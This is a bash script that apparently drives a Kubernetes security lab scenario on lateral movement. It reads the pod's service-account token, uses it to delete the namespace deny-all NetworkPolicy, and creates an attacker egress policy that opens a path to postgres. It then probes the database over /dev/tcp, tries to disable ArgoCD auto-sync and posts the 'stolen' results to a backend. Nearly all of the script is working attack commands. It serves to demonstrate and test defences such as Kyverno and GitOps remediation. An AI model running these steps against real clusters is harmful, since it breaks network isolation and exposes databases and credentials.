#!/bin/bash
# =============================================================================
# Scenario 2 — Lateral Movement via NetworkPolicy Bypass
# attack.sh — two phases: pre-conditions (before deny-all deleted), then exploit
# =============================================================================

set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
NAMESPACE="${NAMESPACE:-secops-lab}"

emit() {
  local phase=$1 severity=$2 title=$3 explanation=$4
  curl -sf -X POST "$BACKEND_URL/internal" \
    -H "Content-Type: application/json" \
    -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
    || true
}

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# =============================================================================
# PHASE 1 — PRE-CONDITIONS (before deny-all is deleted)
# Attacker reads what's already available, discovers network path is blocked
# =============================================================================

# ── Step 1: Read token ────────────────────────────────────────────────────────
emit "ATTACK" "WARNING" \
  "Pod reading network-tooling-sa token" \
  "Token readable at default mount path. Has NetworkPolicy admin rights — narrowly scoped but enough to remove namespace isolation entirely."

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$TOKEN" ]; then
  emit "DETECT" "SUCCESS" \
    "No token found — automountServiceAccountToken: false" \
    "No token at default mount path. Attack cannot proceed."
  exit 0
fi

# ── Step 2: Map NetworkPolicies (silent intelligence gathering) ───────────────
NP_LIST=$(kubectl get networkpolicy \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --no-headers \
  -o custom-columns="NAME:.metadata.name" 2>/dev/null | tr '\n' ', ' | sed 's/,$//' || echo "unknown")

NP_COUNT=$(kubectl get networkpolicy \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --no-headers 2>/dev/null | wc -l | tr -d ' ' || echo "0")

# =============================================================================
# PHASE 2 — EXPLOITATION (delete deny-all, open the path, use the credentials)
# =============================================================================

# ── Step 4: Delete deny-all (Kyverno guard check) ─────────────────────────────
# Control gate: in With-Controls mode protect-networkpolicies blocks this delete
# and the attack stops here. In Allow Attack the guard is down, so it succeeds
# and the attacker proceeds to open a path to the database.
emit "ATTACK" "CRITICAL" \
  "Deleting NetworkPolicy: deny-all" \
  "Removing the namespace default-deny policy. With the Kyverno guard down (Allow Attack), the delete succeeds."

DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  2>&1 || echo "BLOCKED")

if echo "$DELETE_RESULT" | grep -q "BLOCKED\|denied\|forbidden"; then
  emit "DETECT" "SUCCESS" \
    "Kyverno: NetworkPolicy deletion blocked" \
    "Kyverno policy protect-networkpolicies denied the delete request at admission. Isolation intact, database never exposed — window: 0 seconds."
  exit 0
fi

# ── Step 5: Grant target-app a direct egress path to the database ─────────────
# Stripping target-app's OWN egress isolation would also sever its DNS/backend
# connectivity (the agent could no longer operate). Instead the attacker ADDS an
# egress allow to postgres — the workload keeps all its existing access and gains
# a path to the DB. network-tooling-sa can create NetworkPolicies, and Kyverno
# protect-networkpolicies only guards deletion (not creation). Automated
# remediation removes this policy afterwards to close the window.
emit "ATTACK" "CRITICAL" \
  "Creating egress policy: target-app → postgres" \
  "The attacker grants target-app a direct egress path to the database. Combined with the existing allow-target-to-postgres ingress rule, postgres is now reachable from the compromised workload."

kubectl apply \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -f - <<'EOF' 2>/dev/null || true
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: attacker-postgres-exfil
  namespace: secops-lab
spec:
  podSelector:
    matchLabels:
      app: target-app
  policyTypes:
    - Egress
  egress:
    - to:
        - podSelector:
            matchLabels:
              app: postgres
      ports:
        - port: 5432
EOF

# Give the CNI a moment to program the new egress rule before probing.
sleep 2

# ── Step 6: Probe postgres ────────────────────────────────────────────────────
POSTGRES_RESULT=$(bash -c 'echo > /dev/tcp/postgres/5432' 2>/dev/null && echo "OPEN" || echo "blocked")

emit "IMPACT" "CRITICAL" \
  "postgres:5432 → $POSTGRES_RESULT" \
  "TCP probe to the database after the attacker added the egress path. Network path confirmed $POSTGRES_RESULT."

# ── Step 7: Try to suspend ArgoCD (will fail) ─────────────────────────────────
kubectl patch application secops-lab \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}' \
  2>&1 || emit "DETECT" "WARNING" \
    "ArgoCD suspend failed — SA has no rights to argocd namespace" \
    "network-tooling-sa is scoped to secops-lab only. The attacker cannot disable GitOps, so ArgoCD stays in control and will revert the deny-all deletion. Automated remediation also removes the attacker's egress policy — so the breach does not persist."

# ── Step 8: Record window start ───────────────────────────────────────────────
WINDOW_START=$(date +%s)
curl -sf -X POST "$BACKEND_URL/internal/window-start" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"started_at\":$WINDOW_START}" \
  || true

# ── Step 9: Emit final IMPACT ─────────────────────────────────────────────────
emit "IMPACT" "CRITICAL" \
  "postgres=$POSTGRES_RESULT — with credentials stolen pre-attack, attacker can now run: psql -h ${DB_HOST:-postgres} -U ${DB_USER:-app} -d ${DB_NAME:-appdb}" \
  "Credentials were harvested in Phase 1; the attacker-created egress policy now gives them a live path to the database. The attacker cannot disable GitOps, so automated remediation removes that policy and ArgoCD restores deny-all + protect-networkpolicies — closing the path. The breach is bounded by detection + remediation time."

# ── Step 10: Send stolen data to backend ──────────────────────────────────────
STOLEN=$(jq -n \
  --arg postgres "postgres:5432 → $POSTGRES_RESULT" \
  --arg action "Created NetworkPolicy 'attacker-postgres-exfil' granting target-app egress to postgres:5432 — database access opened, and stays open until automated remediation removes the policy." \
  '{postgres_access: $postgres, attacker_action: $action}')

curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"data\":$(echo "$STOLEN" | jq -Rs .)}" \
  || true

echo "Attack complete — DB path open via attacker egress policy; awaiting SOC remediation to close the window"
